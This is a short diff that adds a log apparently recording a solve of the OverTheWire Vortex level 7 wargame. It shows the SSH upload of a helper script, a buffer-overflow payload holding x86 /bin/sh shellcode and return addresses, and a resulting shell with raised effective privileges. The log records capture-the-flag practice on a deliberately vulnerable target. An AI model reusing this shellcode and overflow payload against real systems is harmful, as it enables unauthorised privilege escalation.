@@ -1,0 +1,8 @@
+[+] Connecting to vortex.labs.overthewire.org on port 22: OK
+[*] Working directory: '/tmp/tmp.1pmJOhpWU4'
+[*] Uploading 'r.sh' to '/tmp/tmp.1pmJOhpWU4/r.sh'
+[+] Opening new channel: "bash r.sh /vortex/vortex7 $'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaara\\\xdc\xff\xff`\xdc\xff\xff1\xc9\
+xf7\xe9j\x01\xfe\x0c$h//shh/bin\xb0\x0b\x89\xe3\xcd\x80aavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab
+vaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\xa2\x8c\xcca'": OK
+[+] id: uid=5007(vortex7) gid=5007(vortex7) euid=5008(vortex8) groups=5008(vortex8),5007(vortex7)
+[+] password: <removed>
